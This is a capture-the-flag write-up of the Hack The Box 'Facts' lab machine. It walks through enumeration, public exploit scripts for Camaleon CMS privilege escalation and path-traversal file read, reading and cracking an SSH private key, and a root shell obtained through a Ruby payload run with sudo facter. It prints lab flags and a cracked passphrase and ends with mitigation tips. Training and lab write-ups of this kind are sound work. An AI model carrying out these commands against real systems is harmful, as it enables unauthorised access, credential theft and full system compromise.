# 🖥️ HTB: [Facts]

**Dificultad:**  🟢 Easy
**OS:** [🐧 Linux 
**IP:** `10.10.XX.XX`

---

## 📝 Executive Summary

> **Facts** is an entry-level Linux machine that focuses on **Web Exploitation** and **Linux Privilege Escalation**. The initial foothold is gained by exploiting a vulnerable version of **Camaleon CMS 2.9.0**, allowing for an upgrade from a standard user to Administrator and then utilizing a **Local File Inclusion (LFI)** vulnerability to extract sensitive SSH keys. Final privilege escalation to **root** is achieved by abusing **sudo** permissions on the **Facter** utility, which allows the execution of arbitrary Ruby code through custom directories.

---

## 🛠 Tools Used

- **Enumeration:** Nmap, Gobuster, Wappalyzer, WhatWeb.
- **Access/Exploitation:** Python (CVE-2025-2304 & CVE-2024-46987), Ruby.
- **Cracking:** John the Ripper, `ssh2john.py`.
- **Post-Exploitation:** Facter.
- **Documentation:** Obsidian Vault.

---

## 🔍 Phase 1: Enumeration

### 1.1 Network Scanning

```
nmap -Pn 10.129.15.39 
```

| PORT   | STATE | SERVICE |
| ------ | ----- | ------- |
| 22/tcp | open  | ssh     |
| 80/tcp | open  | http    |

### 1.2 Web Reconnaissance

Since `facts.htb` did not have a DNS entry, I added the following line to my `/etc/hosts` file: `10.129.15.39 facts.htb`
#technique/dns-resolution

``` bash
sudo nano /etc/hosts 
```

![[01F-website.png]]

**Directory Brute Forcing:**
``` bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
```

**Key Findings:**
- `/admin`: Redirects to login page. http://facts.htb/admin/profile/edit
- `/up.php`: Possible file upload point.
- `/robots.txt`: Found on the server (Size: 99).

**CMS Detection:** Using the dashboard footer and Wappalyzer, I identified the site runs on **Camaleon CMS 2.9.0**.

---

## 🚀 Phase 2: Exploitation (User Flag)

### 2.1 Vulnerability Discovery

> **Finding:** The CMS version (2.9.0) is vulnerable to Privilege Escalation and Arbitrary File Read.

- **Initial Access:** I created a standard user account (`user:user`) to gain access to the dashboard.
![[02F-dashboard.png]]
- **Privilege Escalation (CVE-2025-2304):** Allowed me to promote a regular user to Admin.
- **Arbitrary File Read (CVE-2024-46987):** Allowed me to read files outside the web directory via Path Traversal.
### 2.2 Gaining Access

1. **Step 1: Privilege Escalation**
I used this repository: [predyy/CVE-2025-2304](https://github.com/predyy/CVE-2025-2304.git).
```bash
# Promoting 'user' to Admin
python3 exp.py http://facts.htb user user
```
_Successfully logged into the admin panel at `http://facts.htb/admin`._

![[03F-admin.png]]

2. **Step 2: System Enumeration (LFI)**
Using the repository [Goultarde/CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987.git), I read `/etc/passwd` to find system users.

``` bash
python3 CVE-2024-46987.py -u http://facts.htb -l user -p user /etc/passwd
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

3.  **Step 3: Flag Retrieval**
I targeted the home directories of the identified users to find the flag.

```bash
# Checking user 'trivia'
python3 CVE-2024-46987.py -u http://facts.htb -l user -p user /home/trivia/user.txt
# (Empty/No access)

# Checking user 'william'
python3 CVE-2024-46987.py -u http://facts.htb -l user -p user /home/william/user.txt
# Output: 221d84bf1990692a8fae1682304e1193
```

**Attempting SSH Key Extraction (Failed):**
```bash
python3 CVE-2024-46987.py -u http://facts.htb -l user -p user /home/william/.ssh/id_rsa
# (No output/Permission denied)
```

**🚩 User Flag:** `221d84bf1990692a8fae1682304e1193`

---

## ⚡ Phase 3: Privilege Escalation (Root Flag)
#tool/john-the-ripper #tool/facter #technique/ssh-cracking #technique/sudo-exploitation #exploit/ruby-injection

### 3.1 Local Enumeration

- **Current User:** `trivia` (UID 1000).
- **Vector Found:** Using `sudo -l`, I found that the user can run `/usr/bin/facter` as **root** without a password (`NOPASSWD`).
- **Vulnerability:** Facter allows loading custom Ruby scripts from a directory. Since it runs as root, any script I load will execute with root privileges.

### 3.2 Path to Root

**Step 1: Extract the SSH Private Key** I used the LFI vulnerability (CVE-2024-46987) to read the private key of the user `trivia`.

```bash
# Use the script to read trivia's private key
python3 CVE-2024-46987.py -u http://facts.htb -l user -p user /home/trivia/.ssh/id_ed25519
```

_Note: I copied the output and saved it as `id_ed25519` on my Kali machine._

**Step 2: Crack the SSH Passphrase** The key was encrypted. I used `ssh2john` to get the hash and `john` to crack it using the `rockyou.txt` wordlist.

```bash
# Convert key to John format
python3 /usr/share/john/ssh2john.py id_ed25519 > key.john

# Crack the password
john --wordlist=/usr/share/wordlists/rockyou.txt key.john
```

- **Password Found:** `dragonballz`

**Step 3: SSH Login** I logged into the target machine using the cracked key.
``` bash
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@10.129.15.181
```

**Step 4: Exploit Facter to gain Root** Inside the SSH session, I created a malicious Ruby script and ran it with `facter` using sudo.

```bash
# Create a temporary directory and the Ruby payload
mkdir -p /tmp/facts
echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/facts/pwn.rb

# Run facter with root privileges to trigger the shell
sudo /usr/bin/facter --custom-dir /tmp/facts
```

**🚩 Root Flag:** `aca88fead550ca592799464dd3443240`

---

## 📖 Notas Post-Explotación

### Credenctials

|**User**|**Credential Type**|**Value**|
|---|---|---|
|`user`|Password (Web)|`user`|
|`trivia`|SSH Key Passphrase|`dragonballz`|

### Interesting docs

|**Path**|**Description**|
|---|---|
|`/home/trivia/.ssh/id_ed25519`|Private SSH key for the user `trivia`|
|`/home/william/user.txt`|User flag location|
|`/root/root.txt`|Root flag location|

---

## 💡 Lessons Learned & Tips

**Reconnaissance Tools:**

- **Wappalyzer (Visual):** Detected Camaleon CMS 2.9.0 via footer/scripts.
- **WhatWeb (Terminal):** Confirmed Nginx 1.26.3 on Ubuntu but missed CMS signatures due to custom cookie naming (`_factsapp_session`).

**Security Best Practices:**

- **LFI Prevention:** Always sanitize user input in file download/read functions to prevent path traversal.
- **Sudo Hygiene:** Avoid granting **sudo** permissions to utilities like **Facter** or interpreters (Python, Ruby, Perl) that allow arbitrary code execution.

Would you like me to help you format a "Mitigation" section specifically for developers or system administrators based on these findings?